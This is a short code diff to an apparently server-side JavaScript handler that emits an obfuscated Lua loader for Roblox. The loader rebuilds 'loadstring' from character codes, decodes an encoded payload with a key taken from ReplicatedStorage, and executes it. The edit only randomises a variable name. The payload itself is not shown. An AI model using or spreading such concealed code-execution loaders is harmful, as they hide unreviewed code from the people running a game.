@@ -150,10 +150,11 @@ export default {
       const encoded = EncodeScript(content, String(data.Key));
       const decodedStr = GetRandomName();
       const fnStr = GetRandomName();
+      const objStr = GetRandomName();
       const script = `
       function ${decodedStr}(encodedStr, key) local result = {} local parts = string.split(encodedStr, "/") for i = 1, #parts do local byte = tonumber(parts[i]) local k = key:byte(((i - 1) % #key) + 1) local decoded = (byte - k + 256) % 256 table.insert(result, string.char(decoded)) end return table.concat(result) end 
-      local a = game local b = "GetService" local c = "ReplicatedStorage" local d = "Destroy" obj = a[b](a, c)["${data.Name}"].Value 
-      local ${fnStr}="";for _, c in ipairs({108, 111, 97, 100, 115, 116, 114, 105, 110, 103}) do ${fnStr}=${fnStr}..string.char(c);end(getfenv()[${fnStr}] or _G[${fnStr}] or _ENV and _ENV[${fnStr}])(${decodedStr}("${encoded}", obj))()`;
+      local a = game local b = "GetService" local c = "ReplicatedStorage" local d = "Destroy" ${objStr} = a[b](a, c)["${data.Name}"].Value 
+      local ${fnStr}="";for _, c in ipairs({108, 111, 97, 100, 115, 116, 114, 105, 110, 103}) do ${fnStr}=${fnStr}..string.char(c);end(getfenv()[${fnStr}] or _G[${fnStr}] or _ENV and _ENV[${fnStr}])(${decodedStr}("${encoded}", ${objStr}))()`;
 
       return new Response(script, {
         headers: { "Content-Type": "text/plain" }
